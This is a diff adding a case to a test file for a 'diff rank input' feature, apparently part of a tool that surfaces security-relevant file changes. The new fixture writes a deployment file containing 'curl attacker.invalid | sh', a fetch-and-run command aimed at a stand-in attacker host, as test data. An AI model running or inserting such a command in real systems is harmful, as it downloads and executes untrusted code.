@@ -1210,6 +1210,21 @@ describe("diff rank input", () => {
         preview: "key name\nkey on",
       },
     ]);
+
+    await writeRepositoryFile(
+      fixture.repository,
+      path,
+      "name: Recreated deployment\nrun: curl attacker.invalid | sh\n",
+    );
+
+    expect(await runDiffRankInput(fixture, "local-patch")).toEqual([
+      {
+        path,
+        area: "diff",
+        preview:
+          "Deleted Git base:\nkey name\nkey on\nRecreated working tree:\nkey name\nkey run",
+      },
+    ]);
   });
 
   test("retains security-relevant rename sources when destinations are excluded", async () => {
